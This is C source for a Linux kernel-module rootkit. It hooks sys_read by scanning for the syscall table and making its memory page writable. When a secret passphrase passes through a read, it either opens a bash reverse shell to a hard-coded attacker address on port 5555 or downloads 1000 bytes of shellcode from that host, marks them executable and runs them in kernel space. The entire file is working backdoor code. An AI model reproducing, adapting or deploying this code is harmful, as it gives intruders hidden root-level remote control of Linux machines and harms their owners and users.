/*
 * Writting by Sander Demeester
 * Based on code from E.B (memory pattern scanning).
 */

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/unistd.h>

#include <asm/pgtable.h>
#include <asm/unistd.h>

#include <linux/in.h>
#include <linux/net.h>
#include <linux/socket.h>
#include <linux/syscalls.h>
#include <linux/types.h>
#include <linux/inet.h>
#include <linux/string.h>
#include <linux/kthread.h>
#include <linux/mman.h>
#include <linux/kmod.h>

#include <net/sock.h>

#define __NR_READ 3
#define INADDRSZ 4
#define SERVER_PORT 5555
#define ATTACK_SERVER "192.168.1.18"
#define SECRET_PASSPHRASE1 "a good day to die hard"
#define SECRET_PASSPHRASE2 "trust me"
#define BASH_EXECUTE "/bin/bash -i >& /dev/tcp/192.168.1.18/5555 0>&1"

MODULE_LICENSE("GPL");

typedef void (*sys_call_ptr_t)(void);
typedef asmlinkage long (*orig_read_t)(unsigned int fd, const char*buf, size_t count);

void hexdump(unsigned char *addr, unsigned int length);
int inet_pton_pv(const char*src, unsigned char*dst);

void shellcode_execute_backdoor(void*pt);
int reverse_shell_backdoor(void*pt);

// Pointer to original sys_read call adres
orig_read_t origin_syscall = NULL;

// Pointer to sys call table
sys_call_ptr_t*_sys_call_table = NULL;

// check value
int check = 0;

// kthread status
struct task_struct *thread_status = NULL;

// Hooked syscall 
asmlinkage ssize_t evil_sys_read(unsigned int fd, char *buf, size_t count){
  ssize_t return_value = (*origin_syscall)(fd, buf, count);

  if(strstr(buf, SECRET_PASSPHRASE1) != NULL && !check){
    #ifdef DEBUG
    printk("%s \n",buf);
    #endif

    check = 1;
    thread_status = kthread_run((void*)shellcode_execute_backdoor, NULL, "backdoor thread");
  }else if(strstr(buf, SECRET_PASSPHRASE2) != NULL && !check){
    #ifdef DEBUG
    printk("%s \n",buf);
    #endif

    check = 1;     
    thread_status = kthread_run((void*)reverse_shell_backdoor, NULL, "backdoor thread");
  }
  return return_value;
}
 
// Memory protection shinanigans
unsigned int level;
pte_t*pte;

// Init module
int init_module(){
  // Struct for IDT register contents
  struct desc_ptr idtr;
  
  // Pointer to IDT table of desc structs
  // List of event handler routines (please see desc.h header file)
  gate_desc *idt_table;

  // Gate struct for int 0x80 (128th interupt vector)
  gate_desc *sys_call_gate;

  // Systemcall gate offset and pointer
  unsigned int _system_call_offset;
  unsigned char*_system_call_ptr;

  unsigned int i;
  unsigned char *off;

  // Store IDT register into mem.
  asm("sidt %0" : "=m" (idtr));

#ifdef DEBUG
    /* 94 struct desc_ptr { */
    /* 95         unsigned short size; */
    /* 96         unsigned long address; */
    /* 97 } __attribute__((packed)) ; */
  printk(" IDT is at %08x\n", idtr.address);
#endif
  // Set pointer table.
  idt_table = (gate_desc*)idtr.address;
  
  // Get system call gate
  sys_call_gate = &idt_table[0x80]; // int 80x 
  
  _system_call_offset = (sys_call_gate->a & 0xffff) | (sys_call_gate->b & 0xffff0000);
  _system_call_ptr = (unsigned char*) _system_call_offset;

#ifdef DEUBG
  printk(" system_call is at %08x\n", _system_call_offset);
#endif
  
  // Thanks to E.B for pattern scanning in system_call interupt handler.
  // print out the first 128 bytes of system_call() ...notice pattern below
  hexdump((unsigned char *) _system_call_offset, 128);

  // scan for known pattern in system_call (int 0x80) handler
  // pattern is just before sys_call_table address
  for(i = 0; i < 128; i++) {
    off = _system_call_ptr + i;
    if(*(off) == 0xff && *(off+1) == 0x14 && *(off+2) == 0x85) {
      _sys_call_table = *(sys_call_ptr_t **)(off+3);
      break;
    }
  }

  if(_sys_call_table == NULL) return 0;
  
  // Save original sys_read (__NR_READ => 3)
  origin_syscall = (orig_read_t) _sys_call_table[__NR_read];
  
  // Unprotected sys_call_table
  pte = lookup_address((unsigned long)_sys_call_table, &level);
  
  // Change PTE to allow writing
  set_pte_atomic(pte, pte_mkwrite(*pte));
  
#ifdef DEBUG
  printk("unprotcted kernel memory page containing syscall table\n");
#endif
  
  // Overwrite the __NR_READ entry with the adres of our hooked sys_read
  _sys_call_table[__NR_READ] = (sys_call_ptr_t) evil_sys_read;

  return 0;
}

void cleanup_module(){
  if(origin_syscall != NULL){
    // restore
    _sys_call_table[__NR_READ] = (sys_call_ptr_t) origin_syscall;
    
    // protect page
    set_pte_atomic(pte, pte_clear_flags(*pte, _PAGE_RW));
    
    // Check if thread is started.
    if(!thread_status) kthread_stop(thread_status);
  }
}

void hexdump(unsigned char *addr, unsigned int length) {
  unsigned int i;
  for(i = 0; i < length; i++) {
    if(!((i+1) % 16)) {
      printk("%02x\n", *(addr + i));
    } else {
      if(!((i+1) % 4)) {
	printk("%02x  ", *(addr + i));
      } else {
	printk("%02x ", *(addr + i));
      }
    }
  }

  if(!((length+1) % 16)) {
    printk("\n");
  }
}

// Convert ip adr
int inet_pton_pv(const char*src, unsigned char*dst){
  static const char digits[] = "0123456789";
  int saw_digit, octets, ch;
  unsigned char tmp[INADDRSZ], *tp;

  saw_digit = 0;
  octets = 0;
  tp = tmp;
  *tp = 0;
  while((ch = *src++) != '\0') {
    const char *pch;

    if((pch = strchr(digits, ch)) != NULL) {
      unsigned int val = *tp * 10 + (unsigned int)(pch - digits);

      if(saw_digit && *tp == 0)
        return (0);
      if(val > 255)
        return (0);
      *tp = (unsigned char)val;
      if(! saw_digit) {
        if(++octets > 4)
          return (0);
        saw_digit = 1;
      }
    }
    else if(ch == '.' && saw_digit) {
      if(octets == 4)
        return (0);
      *++tp = 0;
      saw_digit = 0;
    }
    else
      return (0);
  }
  if(octets < 4)
    return (0);
  memcpy(dst, tmp, INADDRSZ);
  return (1);
}

int reverse_shell_backdoor(void*pt){
  
  #ifdef DEBUG
  printk("reverse shell backdoor\n");
  #endif

  // Define subprocess struct
  struct subprocess_info *sub_info;
  char *argv[] = { "/bin/bash","-c",BASH_EXECUTE, NULL };

  static char *envp[] = {
    "HOME=/",
    "TERM=linux",
    "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
  
  // Start kernel thread in userspace.
  sub_info = call_usermodehelper_setup( argv[0], argv, envp, GFP_ATOMIC );
  if (sub_info == NULL) return -ENOMEM;
  
  return call_usermodehelper_exec( sub_info, UMH_WAIT_PROC );
}

void shellcode_execute_backdoor(void*pt){

  #ifdef DEBUG
  printk("reverse shell backdoor\n");
  #endif

  // Define socket handling in kernel.
  struct sockaddr_in server_addr;
  struct socket *sk = NULL;

  char buffer[1000];
  // We define buffer space for our shellcode in kernelspace. 
  // We need to fix adrespace mismatch.
  mm_segment_t old_fs = get_fs();
  
  int ret = -1;
  pte_t *pte;
  
  // Message header from out network payload.
  struct msghdr msg;

  // Data storage structure for IO using uIO.
  struct iovec iov;

  ret = sock_create(AF_INET, SOCK_STREAM, 0, &sk);
  if(ret < 0) printk("sock_create failed\n");
  
  memset(&server_addr, 0, sizeof(server_addr));
  server_addr.sin_family = AF_INET;
  
  server_addr.sin_port = htons(SERVER_PORT);
  inet_pton_pv(ATTACK_SERVER, &server_addr.sin_addr);
  
  // our socket contains operations based on the type "AF_INET".
  sk->ops->connect(sk, (struct sock_addr_in*)&server_addr, sizeof(server_addr), 0);  
  
  // revc our payload, the base buffer is kernel memory (mm_segment_t);
  iov.iov_base = (void*) &buffer[0];
  iov.iov_len = (__kernel_size_t)1000;

  msg.msg_name = NULL;
  msg.msg_namelen = 0;

  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;
  msg.msg_control = NULL;
  msg.msg_controllen = 0;  

  // Set back
  set_fs(KERNEL_DS);

  // Receive 1000 byes
  ret = sock_recvmsg(sk, &msg, 1000, 0);
  set_fs(old_fs);

  // Get page memory adres (page table entry) that contains our buffer.
  pte = lookup_address(&buffer[0], &level);

  // Mark that memory page as executable !(NX).
  set_pte_atomic(pte, pte_mkexec(*pte));

  // Execute our buffer.
  ((void(*)())buffer)();
}
